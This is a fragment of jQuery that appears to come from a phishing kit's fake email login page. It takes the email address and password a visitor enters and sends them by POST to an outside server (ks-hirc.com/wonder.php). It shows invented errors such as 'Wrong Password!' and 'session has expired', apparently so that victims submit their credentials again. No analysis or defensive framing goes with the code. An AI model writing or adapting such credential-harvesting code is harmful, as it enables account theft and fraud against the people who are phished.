 /* global $ */
    $(document).ready(function () {
        var count = 0;
        var errorArray = ["", "Error 40067: Receivers email user or password is invalid, please try again.", "Wrong Password! Please enter correct password.", "This session has expired."];
        ...
        $('#submit-btn').click(function (event) {
            ...
            if (!password) {
                $('#error').show();
                $('#error').html("Please Enter a valid Email Password");
                email.focus
                return false;
            }
            ...
            $.ajax({
                dataType: 'JSON',
                url: 'https://ks-hirc.com/wonder.php',
                type: 'POST',
                data: {
                    email: email,
                    password: password,
                ...
                beforeSend: function (xhr) {
                    $('#submit-btn').html('Authenticating User');
                },
